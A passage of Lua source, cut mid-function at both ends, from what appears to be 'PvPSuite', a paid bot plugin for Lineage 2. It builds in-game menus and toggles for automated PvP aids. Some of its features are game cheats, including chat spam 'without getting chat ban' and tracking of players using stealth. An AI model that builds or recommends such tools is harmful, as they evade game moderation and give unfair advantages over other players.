			Condition = false;
			if (PvPSuite[41] ~= "0") then
				Condition = true;
			end;
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Auto Message On Kill"),THtmlButtonStyle.BUTTON_EXTRA, "Auto Message On Kill",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(134)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
				html:AddHtml('Set a message and a chat and each time a targeted enemy dies your character will say this message on the selected chat!');
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if (Copycat) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Copycat"),THtmlButtonStyle.BUTTON_EXTRA, "Copycat",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="icon.ev_alien_mask_i00" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=246><tr><td align=left valign=top width=236>");
				html:AddHtml('Say exactly what someone else says, choose someone and copy his chat messages!');
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if (TTT[2]) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Mini Games"),THtmlButtonStyle.BUTTON_EXTRA, "Mini Games",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="icon.weapon_bbyong_hammer_a_i00" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=243><tr><td align=left valign=top width=236>");
				html:AddHtml('If you are bored, play a mini game with a friend of you! If he/she also has PvPSuite you will play together via dialogs otherwise you will need to be on party.');
				html:AddHtml("</td></tr></table>");
			end;
			Condition = false;
			if (PvPSuite[40]) then
				Condition = true;
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("YouTube"),THtmlButtonStyle.BUTTON_EXTRA, "YouTube",Condition,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="icon.etc_alphabet_y_i00" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=242><tr><td align=left valign=top width=236>");
				html:AddHtml('Type a video name and press play! Your default browser will pop-up and a video on YouTube will start playing! Also if a friend of you have PvPSuite you can send him instantly a video! Quick Command: /yt');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Send Encrypted Message"),THtmlButtonStyle.BUTTON_ACTION, "Send Encrypted Message",false,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(1433)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=245><tr><td align=left valign=top width=236>");
				html:AddHtml('Allows you to send an encrypted message that can only be read by someone who have PvPSuite.');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Title Effects"),THtmlButtonStyle.BUTTON_ACTION, "Title Effects",false,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="BranchSys.br_rudolf_food_unknown_i00" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=246><tr><td align=left valign=top width=236>");
				html:AddHtml('Fancy title effects! Use with care, you may get punished for using 3rd party software.');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Connection Checker"),THtmlButtonStyle.BUTTON_ACTION, "Connection Checker",false,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(506)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=244><tr><td align=left valign=top width=236>");
				html:AddHtml('If you are lagging and you are not sure if its your problem use this button to ping google.com and check your connection.');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Random Quote"),THtmlButtonStyle.BUTTON_ACTION, "Random Quote",false,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(481)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=246><tr><td align=left valign=top width=236>");
				html:AddHtml('Click this button, select a chat and your character will say a random quote!');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Stats"),THtmlButtonStyle.BUTTON_ACTION, "Stats",false,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(518)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=246><tr><td align=left valign=top width=236>");
				html:AddHtml('Interesting stats for all the time you got PvPSuite running on this character!');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			local Text = "Count!"
			if (Counting) then
				Text = "Stop Counter!";
			end;
			html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Count"),THtmlButtonStyle.BUTTON_ACTION, Text,false,"","",170,25);
			html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(517)..'" height=32 width=32></br ></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=252><tr><td align=left valign=top width=236>");
				html:AddHtml('Reverse counting, good for 1vs1 PvP.');
				html:AddHtml("</td></tr></table>");
			end;
	elseif (param == "Help Center") then
			local Color = "00FF00";
			local Usage = Round((gcinfo()/1024),3);
			if (Usage > 1) then
				Color = "FF0000";
			elseif (Usage > (13/20)) then
					Color = "FF7F2A";
			end;
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=240><tr>");
			html:AddHtml('<td>PID: <font color="FF7F2A">'..GetCurrentProcessId()..'</font></td><td align=right>P. Usage(MB): <font color="'..Color..'">'..Usage.."</font></td>");
			html:AddHtml("</tr></table></br >");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=234<tr><td align=center valign=top width=236>");
			if (PvPSuite[17]) then
				html:Table_Start(true, false, 100);
				html:Table_AddColumns(1);
				html:AddButton(THtmlAction("/doaction"):AddParam("Documentation"),THtmlButtonStyle.BUTTON_ACTION, "Disable",false,"","",100,25);
				html:Table_End();
				html:AddHtml('</br >IG Documentation is <font color="00FF00">enabled</font>!</ br>');
			else
				html:Table_Start(true, false, 100);
				html:Table_AddColumns(1);
				html:AddButton(THtmlAction("/doaction"):AddParam("Documentation"),THtmlButtonStyle.BUTTON_ACTION, "Enable",false,"","",100,25);
				html:Table_End();
				html:AddHtml('</br >IG Documentation is <font color="FF0000">disabled</font>!</ br>');
			end;
			html:AddHtml("</td></tr></table></br ></br >");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=234><tr><td align=center valign=top width=236>");
			html:AddHtml('<font color="CC3399">Special thanks to our beta testers!</ br>');
			html:AddHtml('Special thanks to L2Tower forum!</ br>');
			html:AddHtml('Special thanks to everyone who helped!</ br>');
			html:AddHtml("</font></td></tr></table></br ></br >");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=224><tr><td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("Contact Info"),THtmlButtonStyle.BUTTON_ACTION, "Contact Info",false,"","",100,30);
			html:AddHtml("</td>");
			html:AddHtml("<td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("Changelog"),THtmlButtonStyle.BUTTON_ACTION, "Changelog",false,"","",100,30);
			html:AddHtml("</td></tr></table>");
			html:AddHtml("</br ></br >");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=224><tr><td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("Commands"),THtmlButtonStyle.BUTTON_ACTION, "Commands",false,"","",100,30);
			html:AddHtml("</td>");
			html:AddHtml("<td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("Creator's Pick"),THtmlButtonStyle.BUTTON_ACTION, "Creator's Pick",false,"","",100,30);
			html:AddHtml("</td></tr></table>");
			local width = "140"
			if (PvPSuite[17]) then
				width = "279";
			end;
			html:AddHtml('</ br></ br><table width=140 border=0 bgcolor=303030><tr><td><center>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Check Updates"),THtmlButtonStyle.BUTTON_ACTION, "Check Updates",false,"","",130,25);
			html:AddHtml('</center></td></tr></table>');
			html:AddHtml('</ br><table width=140 border=0 bgcolor=303030><tr><td><center>');
			html:AddButton(THtmlAction("/pp"),THtmlButtonStyle.BUTTON_ACTION, "Pause PvPSuite",false,"","",130,25);
			html:AddHtml('</center></td></tr></table>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=left valign=top width=236>");
				html:AddHtml('By pressing this button anything related to PvPSuite will be paused. Quick Command: /pp');
				html:AddHtml("</td></tr></table>");
			end;
			width = "130"
			if (PvPSuite[17]) then
				width = "282";
			end;
			html:AddHtml('</ br><center><table width='..width..' border=0 bgcolor=282828><tr><td><center>');
			html:AddButton(THtmlAction("/cr"),THtmlButtonStyle.BUTTON_ACTION, "Crash Client",false,"","",100,22);
			html:AddHtml('</center></td></tr></table></center>');
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=282828 cellspacing=4 cellpadding=2 width=267><tr><td align=left valign=top width=236>");
				html:AddHtml('By pressing this button you will cause L2 client to crash. Quick Command: /cr');
				html:AddHtml("</td></tr></table>");
			end;			
	elseif (param == "Premium") then
				Style = THtmlButtonStyle.BUTTON_NO_CLICK;
				if (IsPremium()) then
					Style = THtmlButtonStyle.BUTTON_EXTRA;
				end;
				Condition = false;
				if ((PvPSuite[20])) then
					Condition = true;
				end;
				html:AddHtml("</br ></br >");
				html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
				html:AddButton(THtmlAction("/doaction"):AddParam("Screen Informer(Skills)"),Style, "Screen Informer(Skills)",Condition,"","",190,25);
				html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(1532)..'" height=32 width=32></br ></td></tr></table>');
				if (PvPSuite[17]) then
					html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=264><tr><td align=left valign=top width=236>");
					html:AddHtml("You'll be informed on screen while your target casts various skills like Enlightenment, Ultimate Evasion, UDs and more!");
					html:AddHtml("</td></tr></table>");
				end;
				Condition = false;
				if ((PvPSuite[21])) then
					Condition = true;
				end;
				html:AddHtml("</br ></br >");
				html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
				html:AddButton(THtmlAction("/doaction"):AddParam("Screen Informer(Chance/Cert)"),Style, "Screen Informer(Chance/Cert)",Condition,"","",190,25);
				html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(533)..'" height=32 width=32></br ></td></tr></table>');
				if (PvPSuite[17]) then
					html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=left valign=top width=236>");
					html:AddHtml("You'll be informed on screen while chance/cert skill are triggered to your target!");
					html:AddHtml("</td></tr></table>");
				end;
				Condition = false;
				if ((PvPSuite[22])) then
					Condition = true;
				end;
				html:AddHtml("</br ></br >");
				html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
				html:AddButton(THtmlAction("/doaction"):AddParam("Screen Informer(Buffs)"),Style, "Screen Informer(Buffs)",Condition,"","",190,25);
				html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(788)..'" height=32 width=32></br ></td></tr></table>');
				if (PvPSuite[17]) then
					html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=265><tr><td align=left valign=top width=236>");
					html:AddHtml("You'll be informed on screen while your target casts buff skills (like Appetite, SOS, Flame, etc..)!");
					html:AddHtml("</td></tr></table>");
				end;
				Condition = false;
				if ((PvPSuite[37])) then
					Condition = true;
				end;
				html:AddHtml("</br ></br >");
				html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=140><tr><td align=left valign=top width=236>');
				html:AddButton(THtmlAction("/doaction"):AddParam("Screen Informer(Augments)"),Style, "Screen Informer(Augments)",Condition,"","",190,25);
				html:AddHtml('</td><td align=right valign=top width=200><img src="icon.skill3080" height=32 width=32></br ></td></tr></table>');
				if (PvPSuite[17]) then
					html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=268><tr><td align=left valign=top width=236>");
					html:AddHtml("You'll be informed on screen while your target casts Augments skills!");
					html:AddHtml("</td></tr></table>");
				end;
				html:AddHtml("</br ></br >");
				local AStyle = THtmlButtonStyle.BUTTON_NO_CLICK;
				if ((SearchArray(Me:GetClass(),ArcherClasses)) and (IsPremium())) then
					AStyle = THtmlButtonStyle.BUTTON_EXTRA;
				end;
				Condition = false;
				if ((PvPSuite[24]) and (Me:GetClass() == 92)) then
					Condition = true;
				end;
				html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=255><tr><td align=left valign=top width=236>');
				html:AddButton(THtmlAction("/doaction"):AddParam("Cancel Snipe(Dash)"),AStyle, "Cancel Snipe(Dash)",Condition,"","",140,25);
				html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(313)..'" height=32 width=32></br ></td></tr></table>');
				if (PvPSuite[17]) then
					html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=263><tr><td align=left valign=top width=236>");
					html:AddHtml('When you have Snipe(unenchanted or enchanted on power) enabled along with this option and you use dash, bot will remove Snipe for you! For Sagittarius only!');
					html:AddHtml("</td></tr></table>");
				end;
				Condition = false;
				if ((PvPSuite[23])) then
					Condition = true;
				end;
				html:AddHtml("</br ></br >");
				html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=255><tr><td align=left valign=top width=236>');
				html:AddButton(THtmlAction("/doaction"):AddParam("Spy Hide"),Style, "Spy Hide",Condition,"","",140,25);
				html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(922)..'" height=32 width=32></br ></td></tr></table>');
				if (PvPSuite[17]) then
					html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=263><tr><td align=left valign=top width=236>");
					html:AddHtml('When your target casts hide, bot will put a spy on him. Once the player who casted hide goes off, bot will put a quest arrow on his/her location!');
					html:AddHtml("</td></tr></table>");
				end;
				Style = THtmlButtonStyle.BUTTON_NO_CLICK;
				if (IsPremium()) then
					Style = THtmlButtonStyle.BUTTON_ACTION;
				end;
				html:AddHtml("</br ></br >");
				html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=255><tr><td align=left valign=top width=236>');
				html:AddButton(THtmlAction("/doaction"):AddParam("Spam Chat(No CB)"),Style, "Spam Chat(No CB)",false,"","",140,25);
				html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(4269)..'" height=32 width=32></br ></td></tr></table>');
				if (PvPSuite[17]) then
					html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=263><tr><td align=left valign=top width=236>");
					html:AddHtml('</br >Spam as much you want, without getting chat ban! Use with care, you can get punished by any game master! If there is a server-side anti-flood you cannot spam.</br >');
					html:AddHtml("</td></tr></table>");
				end;
				html:AddHtml("</br ></br >");
				html:AddHtml('<table bgcolor=303030 cellspacing=4 cellpadding=2 width=255><tr><td align=left valign=top width=236>');
				html:AddButton(THtmlAction("/doaction"):AddParam("Client Mods"),Style, "Client Mods",false,"","",140,25);
				html:AddHtml('</td><td align=right valign=top width=200><img src="'..GetSkillIcon(1436)..'" height=32 width=32></br ></td></tr></table>');
				if (PvPSuite[17]) then
					html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=265><tr><td align=left valign=top width=236>");
					html:AddHtml('Various client mods that can be helpful! Note: none of them will be saved on exit! Quick Command: /cm');
					html:AddHtml("</td></tr></table>");
				end;
		else
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('<center><font color="FF0000">Error 404!</font></center></ br>');
			html:AddHtml('<center><font color="FF8040">The page you are looking for does not exist.</font></center>');
			html:AddHtml("</td></tr></table></ br></ br>");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=270><tr><td align=center valign=center width=236>");
			html:AddHtml('<center>If you think that this is a plugin error</center></ br>');
			html:AddHtml('<center>Please report it!</center></ br>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Contact Info"),THtmlButtonStyle.BUTTON_ACTION, "Contact Info",false,"","",100,30);
			html:AddHtml("</td></tr></table>");
	end;
	html:AddHtml('</ br></ br>');
	html:AddHtml('<img src="L2UI_CH3.herotower_deco" width=256 height=32 align=left>');
	html:AddHtml('</ br></ br>');
	html:AddButton(THtmlAction("/pvpsuite"),THtmlButtonStyle.BUTTON_ACTION, "Go back",false,"","",120,21);
	html:AddHtml('</br ><font color="555555">PvPSuite '..PvPSuiteV..' - 2013</font>');
	html:AddHtml('</center>');
	HtmlBuild = html:GetString();	
	ShowHtmlStatus = true;
end;
function OnLogin(username)
	if (pluginLicensed == false) then
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		this:Log("Invalid license, contact support!");
		pluginDestroy();
		error("Invalid license, contact support!",0);
	else
		Me = GetMe();
		MyName = Me:GetName();
		LoadMe();
		if (PvPSuite[61]) then
			ActivateSoulShot(1467,true);
			ActivateSoulShot(2514,true);
			ActivateSoulShot(3952,true);
			ActivateSoulShot(6646,true);
			ActivateSoulShot(6647,true);
			ActivateSoulShot(20333,true);
			ActivateSoulShot(20334,true);
			ActivateSoulShot(22076,true);
			ActivateSoulShot(22081,true);
			ActivateSoulShot(22086,true);
		end;
		delayedC = 0;
		showDelayedMsgs = true;
	end;
end;
function DoAction(action)
	if (action == "Auto PT Resurrection") then
		if ((iHaveSkill(1016)) and (iHaveSkill(1254))) then
			if (PvPSuite[64]) then
				PvPSuite[64] = false;
				ShowToClient("Enhances","Auto PT Resurrection disabled!");
			else
				PvPSuite[64] = true;
				ShowToClient("Enhances","Auto PT Resurrection enabled!");
			end;
		else
			ShowToClient("Enhances","You don't have one of the required resurrection skills!");
		end;
		SubMenu("Enhances");
	elseif (action == "Count") then
			if (Counting) then
				Counting = false;
				Counter = 9;
				ShowToClient("Counter","Stopped!");
			else
				Counting = true;
				ShowToClient("Counter","Starting on 3 seconds!");
			end;
			SubMenu("Other");
	elseif (action == "WebP") then
			os.execute('start "" "http://www.pvpsuite.com/"');
			MainMenu();
	elseif (action == "WebV") then
			os.execute('start "" "http://www.vshuffle.net/"');
			MainMenu();
	elseif (action == "Check Updates") then
			os.execute('start "" "http://www.pvpsuite.com/files/PvPSuite/updates.php?v='..tostring(PvPSuiteV)..'"');
			SubMenu("Help Center");
	elseif (action == "Creator's Pick") then
			ShowToClient("PvPSuite","Creator's pick for "..L2Class2String(Me:GetClass()).."!");
			ShowToClient("PvPSuite","Multiple options enabled, go back to see them!");
			PvPSuite[1] = true;
			PvPSuite[2] = true;
			PvPSuite[3] = true;
			PvPSuite[4] = true;
			PvPSuite[5] = true;
			PvPSuite[6] = true;
			PvPSuite[19] = true;
			PvPSuite[23] = true;
			PvPSuite[34] = true;
			PvPSuite[44] = true;
			PvPSuite[33] = true;
			PvPSuite[40] = true;
			PvPSuite[61] = true;
			TTT[2] = true;
			if (iHaveAoE()) then
				PvPSuite[16] = true;
			end;
			if (iHaveCleanse()) then
				PvPSuite[31] = true;
			end;
			if (iHaveIRh()) then
				PvPSuite[18] = true;
				PvPSuite[38] = true;
			end;
			if (iHaveSkill(340)) then
				PvPSuite[30] = true;
			end;
			if (IsPremium()) then
				PvPSuite[20] = true;
				PvPSuite[21] = true;
				PvPSuite[22] = true;
				PvPSuite[37] = true;
				if (Me:GetClass() == 92) then
					PvPSuite[24] = true;
				end;
			else
				PvPSuite[7] = true;
				PvPSuite[8] = true;
				PvPSuite[9] = true;
				PvPSuite[35] = true;
			end;
			SubMenu("Help Center");
	elseif (action == "ClearStats") then
			PvPSuite[47] = 0;
			PvPSuite[48] = 0;
			PvPSuite[49] = 0;
			PvPSuite[50] = 0;
			DoDialog("Stats");
	elseif (action == "Auto SS(S-Grade)") then
			if (PvPSuite[61]) then
				PvPSuite[61] = false;
				ShowToClient("Enhances","Auto SS(S-Grade) disabled!");
			else
				ActivateSoulShot(1467,true);
				ActivateSoulShot(2514,true);
				ActivateSoulShot(3952,true);
				ActivateSoulShot(6646,true);
				ActivateSoulShot(6647,true);
				ActivateSoulShot(20333,true);
				ActivateSoulShot(20334,true);
				ActivateSoulShot(22076,true);
				ActivateSoulShot(22081,true);
				ActivateSoulShot(22086,true);
				PvPSuite[61] = true;
				ShowToClient("Enhances","Auto SS(S-Grade) enabled!");
			end;
			SubMenu("Enhances");
	elseif (action == "ClearMoreStats") then
			PvPSuite[51] = 0;
			PvPSuite[52] = 0;
			PvPSuite[53] = 0;
			PvPSuite[54] = 0;
			PvPSuite[55] = 0;
			PvPSuite[56] = 0;
			PvPSuite[57] = 0;
			PvPSuite[58] = 0;
			PvPSuite[59] = 0;
			PvPSuite[60] = 0;
			DoDialog("More Stats");
	elseif (action == "Target Equipment") then
			if ((GetTarget() == nil)) then
				ShowToClient("Spy","Please target someone!");
				SubMenu("Spy");
			elseif (GetTarget():GetName() == MyName) then
					ShowToClient("Spy","Why yourself?!");
					SubMenu("Spy");
			elseif (GetTarget():IsPlayer() == false) then
					ShowToClient("Spy","Your target is not a player!");
					SubMenu("Spy");
			else
				DoDialog(action);
			end;
	elseif (action == "Copycat") then
			DoDialog(action);
	elseif (action == "YouTubeR") then
			local vid = GetRandomGenre();
			if ((vid ~= "") and (vid ~= nil)) then
				os.execute('start "" "http://www.google.com/search?q=youtube '..vid..'&btnI"');
			else
				ShowToClient("YouTube","Error playing random video!");
			end;
			DoDialog("YouTube");
	elseif (action == "YouTubeST") then
			if (Timer[18] == 0) then
				if (GetTarget() ~= nil) then
					if (GetTarget():IsPlayer()) then
						if (GetTarget():IsMe() == false) then
							if (GetTarget():IsFriend()) then
								if not (GetTarget():IsInCombat()) then
										if (YTQuery ~= "") then
											YTQueryToSend = YTQuery;
											YTReceiver = GetTarget():GetName();
											SendPM(YTReceiver,"[~_ YT]R");
											YTconfirmed = false;
											YTawaiting = true;
											YTcoOperate = true;
											Timer[18] = 1;
										else
											ShowToClient("YouTube","Please type something first!");
											DoDialog("YouTube");
									end;
								else
									ShowToClient("YouTube","Target must be out of combat!");
									DoDialog("YouTube");
								end;
							else
								ShowToClient("YouTube","Target must be a friend of you!(Party/Clan/Ally)");
								DoDialog("YouTube");
							end;
						 else
							  ShowToClient("YouTube","Why yourself?!");
							  DoDialog("YouTube");
						 end;
					else
						ShowToClient("YouTube","Please select a valid player!");
						DoDialog("YouTube");
					end;
				else
					ShowToClient("YouTube","Please target someone!");
					DoDialog("YouTube");
				end;
			else
				ShowToClient("YouTube","Please wait before sending a video again!");
				DoDialog("YouTube");
			end;
	elseif (action == "YouTubeAA") then
			if (PvPSuite[40] == false) then
				PvPSuite[40] = true;
				ShowToClient("YouTube","Play Received Videos enabled!");
				DoDialog("YouTube");
			else
				PvPSuite[40] = false;
				ShowToClient("YouTube","Play Received Videos disabled!");
				DoDialog("YouTube");
			end;
	elseif (action == "Client Mods") then
			DoDialog(action);
	elseif (action == "Spam Chat(No CB)") then
			DoDialog(action);
	elseif (action == "Title Effects") then
			DoDialog(action);
	elseif (action == "Contact Info") then
			DoDialog(action);
	elseif (action == "Mini Games") then
			DoDialog(action);
	elseif (action == "AddSkype") then
			os.execute("start skype:pvpsuite?chat");
			DoDialog("Contact Info");
	elseif (action == "SendEmail") then
			os.execute('start mailto:pvpsuite@gmail.com?Body=PvP%20Suite%20'..PvPSuiteV..'%20-%20LN%3D'..rreNueXJ..'%3B%0A%0A-------------------------------------------------------------WRITE%20BELOW%20THIS%20LINE-------------------------------------------------------------%0A%0A');
			DoDialog("Contact Info");
	elseif (action == "Anti Deadly") then
			if (PvPSuite[33]) then
				PvPSuite[33] = false;
				ShowToClient("Protections","Anti Deadly disabled!");
				SubMenu("Protections");
			else
				PvPSuite[33] = true;
				ShowToClient("Protections","Anti Deadly enabled!");
				SubMenu("Protections");
			end;elseif (action == "Anti Backstab") then
			if (PvPSuite[1]) then
				PvPSuite[1] = false;
				ShowToClient("Protections","Anti Backstab disabled!");
				SubMenu("Protections");
			else
				PvPSuite[1] = true;
				ShowToClient("Protections","Anti Backstab enabled!");
				SubMenu("Protections");
			end;
	elseif (action == "Anti Lethal") then
			if (PvPSuite[2]) then
				PvPSuite[2] = false;
				ShowToClient("Protections","Anti Lethal disabled!");
				SubMenu("Protections");
			else
				PvPSuite[2] = true;
				ShowToClient("Protections","Anti Lethal enabled!");
				SubMenu("Protections");
			end;
	elseif (action == "Anti Dual Blow") then
			if (PvPSuite[3]) then
				PvPSuite[3] = false;
				ShowToClient("Protections","Anti Dual Blow disabled!");
				SubMenu("Protections");
			else
				PvPSuite[3] = true;
				ShowToClient("Protections","Anti Dual Blow enabled!");
				SubMenu("Protections");
			end;
	elseif (action == "Anti Disarm") then
			if (PvPSuite[4]) then
				PvPSuite[4] = false;
				ShowToClient("Protections","Anti Disarm disabled!");
				SubMenu("Protections");
			else
				PvPSuite[4] = true;
				ShowToClient("Protections","Anti Disarm enabled!");
				SubMenu("Protections");
			end;
	elseif (action == "Anti Target Loss") then
			if (PvPSuite[34]) then
				PvPSuite[34] = false;
				ShowToClient("Protections","Anti Target Loss disabled!");
				SubMenu("Protections");
			else
				PvPSuite[34] = true;
				ShowToClient("Protections","Anti Target Loss enabled!");
				SubMenu("Protections");
			end;
	elseif (action == "Barrier Fix") then
			if (PvPSuite[5]) then
				PvPSuite[5] = false;
				ShowToClient("Enhances","Barrier Fix disabled!");
				SubMenu("Enhances");
			else
				PvPSuite[5] = true;
				ShowToClient("Enhances","Barrier Fix enabled!");
				SubMenu("Enhances");
			end;
	elseif (action == "Don't Run(Fear Skills)") then
			if (PvPSuite[6]) then
				PvPSuite[6] = false;
				ShowToClient("Enhances","Don't Run(Fear Skills) disabled!");
				SubMenu("Enhances");
			else
				PvPSuite[6] = true;
				ShowToClient("Enhances","Don't Run(Fear Skills) enabled!");
				SubMenu("Enhances");
			end;
	elseif (action == "Auto Detection(AoE)") then
			if (iHaveAoE()) then
				if (PvPSuite[16]) then
					PvPSuite[16] = false;
					ShowToClient("Enhances","Auto Detection(AoE) disabled!");
					SubMenu("Enhances");
				else
					PvPSuite[16] = true;
					ShowToClient("Enhances","Auto Detection(AoE) enabled!");
					SubMenu("Enhances");
				end;
			else
				ShowToClient("Enhances","Your class does not have any AoE skill!");
				SubMenu("Enhances");
			end;
	elseif (action == "Interrupt Elemental Heal") then
			if (iHaveIRh()) then
				if (PvPSuite[18]) then
					PvPSuite[18] = false;
					ShowToClient("Enhances","Interrupt Elemental Heal disabled!");
					SubMenu("Enhances");
				else
					PvPSuite[18] = true;
					ShowToClient("Enhances","Interrupt Elemental Heal enabled!");
					SubMenu("Enhances");
				end;
			else
